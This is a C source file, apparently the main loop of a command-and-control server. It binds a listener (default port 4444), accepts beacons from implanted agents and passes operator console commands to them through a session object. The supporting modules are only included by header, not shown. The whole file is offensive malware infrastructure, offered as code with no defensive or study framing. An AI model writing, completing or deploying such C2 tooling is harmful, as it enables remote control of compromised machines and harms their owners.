#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#ifdef _WIN32
  #include <winsock2.h>
  #define StdinFd _fileno(stdin)
#else
  #include <sys/select.h>
  #define StdinFd STDIN_FILENO
#endif

#include "core/Cipher.h"
#include "core/Session.h"
#include "core/Network.h"
#include "core/Console.h"

static void ParseArgs(int Argc, char *Argv[], char *Addr, size_t ALen, int *Port)
{
    for (int I = 1; I < Argc; I++) {
        if (strcmp(Argv[I], "-s") == 0 && I + 1 < Argc)
            strncpy(Addr, Argv[I + 1], ALen - 1);
        if (strcmp(Argv[I], "-p") == 0 && I + 1 < Argc)
            *Port = atoi(Argv[I + 1]);
    }
}

int main(int Argc, char *Argv[])
{
    char Addr[64] = "0.0.0.0";
    int  Port     = 4444;

    if (Argc < 5) {
        fprintf(stderr, "Usage: %s -s <host> -p <port>\n", Argv[0]);
        return 1;
    }

    ParseArgs(Argc, Argv, Addr, sizeof(Addr), &Port);

    if (!NetInit()) {
        fprintf(stderr, "[!] Network init failed.\n");
        return 1;
    }

    NetSock Listener = NetListen(Addr, Port);
    if (Listener == NetInvalid) {
        fprintf(stderr, "[!] Failed to bind %s:%d\n", Addr, Port);
        NetShutdown();
        return 1;
    }
    NetNonBlock(Listener);

    Session S;
    SessionInit(&S);

    printf("C2 Server on %s:%d\n", Addr, Port);
    printf("C2Main> ");
    fflush(stdout);

    while (1) {
        fd_set Fds;
        FD_ZERO(&Fds);
        FD_SET(Listener, &Fds);
        FD_SET(StdinFd,  &Fds);

#ifdef _WIN32
        int MaxFd = 0;
#else
        int MaxFd = Listener > StdinFd ? Listener : StdinFd;
#endif

        struct timeval Tv = { .tv_sec = 0, .tv_usec = 100000 };

        if (select(MaxFd + 1, &Fds, NULL, NULL, &Tv) < 0)
            continue;

        if (FD_ISSET(Listener, &Fds))
            NetHandleBeacon(Listener, &S);

        if (FD_ISSET(StdinFd, &Fds)) {
            char Line[BufSize] = {0};
            if (!ConsoleRead(Line, sizeof(Line)))
                continue;
            if (!ConsoleExec(Line, &S))
                break;
        }
    }

    NetClose(Listener);
    NetShutdown();
    return 0;
}
